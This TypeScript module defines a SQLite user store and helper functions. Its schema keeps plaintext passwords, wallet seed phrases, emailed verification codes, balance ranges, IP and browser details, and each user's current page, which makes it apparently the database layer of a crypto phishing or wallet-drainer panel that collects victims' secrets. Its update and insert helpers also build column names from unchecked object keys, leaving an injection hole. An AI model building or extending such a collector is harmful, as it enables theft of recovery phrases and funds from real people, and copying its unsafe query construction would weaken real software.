import sqlite3 from 'sqlite3';
import { open } from 'sqlite';

// Install @types/better-sqlite3 to fix TypeScript errors:
// npm install --save-dev @types/better-sqlite3

let db: any;

// Initialize database connection
export async function initializeDb() {
  if (!db) {
    db = await open({
      filename: 'users.db',
      driver: sqlite3.Database
    });

    await db.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        uid TEXT,
        email TEXT UNIQUE,
        password TEXT,
        current_page TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        status TEXT DEFAULT 'active',
        user_seed_phrase TEXT,
        email_code TEXT,
        ip_address TEXT,
        browser TEXT,
        operating_system TEXT,
        user_agent TEXT,
        balance_range TEXT,
        connection_info TEXT,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);
  }
  return db;
}

// Define the User type
export interface User {
  id: string;
  uid: string;
  email: string;
  password: string;
  current_page: string;
  created_at: string;
  status: string;
  user_seed_phrase?: string;
  email_code?: string;
  ip_address?: string;
  browser?: string;
  operating_system?: string;
  user_agent?: string;
  balance_range?: string;
  connection_info?: string;
  updated_at: string;
}

// Get all users
export async function getAllUsers() {
  const db = await initializeDb();
  return db.all('SELECT * FROM users ORDER BY updated_at DESC');
}

// Get user by email
export async function getUserByEmail(email: string) {
  const db = await initializeDb();
  return db.get('SELECT * FROM users WHERE email = ?', [email]);
}

// Update user
export async function updateUser(email: string, updates: any) {
  const db = await initializeDb();
  const fields = Object.keys(updates);
  const values = Object.values(updates);

  const setClause = fields.map(field => `${field} = ?`).join(', ');
  const query = `UPDATE users SET ${setClause}, updated_at = CURRENT_TIMESTAMP WHERE email = ?`;

  return db.run(query, [...values, email]);
}

// User operations
export async function createUser(userData: Partial<User>) {
  const db = await initializeDb();
  const fields = Object.keys(userData);
  const values = Object.values(userData);

  const placeholders = fields.map(() => '?').join(', ');
  const query = `INSERT INTO users (${fields.join(', ')}) VALUES (${placeholders})`;

  return db.run(query, values);
}

export async function deleteAllUsers(adminEmail: string) {
  const db = await initializeDb();
  return db.run('DELETE FROM users WHERE email != ?', [adminEmail]);
}